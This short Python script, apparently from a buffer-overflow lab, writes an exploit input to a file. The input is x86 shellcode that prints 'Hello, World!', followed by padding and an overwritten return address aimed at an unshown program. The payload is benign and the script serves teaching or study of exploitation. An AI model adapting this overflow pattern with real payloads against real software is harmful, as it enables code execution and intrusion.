import os
data = '\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb2\x0e\x59\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a'
arg = 'AAAAAAAAAAAAAAAAAAAAAAAA\x60\x10\x60\x00\x00\x00\x00\x00'
f = open('abc', 'wb')
f.writelines(data)
f.write(arg)
f.close()
